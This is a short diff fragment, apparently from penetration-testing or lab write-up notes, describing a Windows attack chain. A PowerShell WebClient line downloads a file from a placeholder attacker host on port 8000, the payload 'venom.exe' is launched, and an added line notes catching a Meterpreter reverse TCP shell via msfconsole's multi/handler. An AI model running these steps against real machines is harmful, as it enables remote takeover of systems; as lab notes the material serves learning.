@@ -34,3 +34,4 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/she
 Start venom.exe:
 Start-Process "venom.exe"
 
+Then I started msfconsole and selected  windows/meterpreter/reverse_tcp and multi/handler payload, run
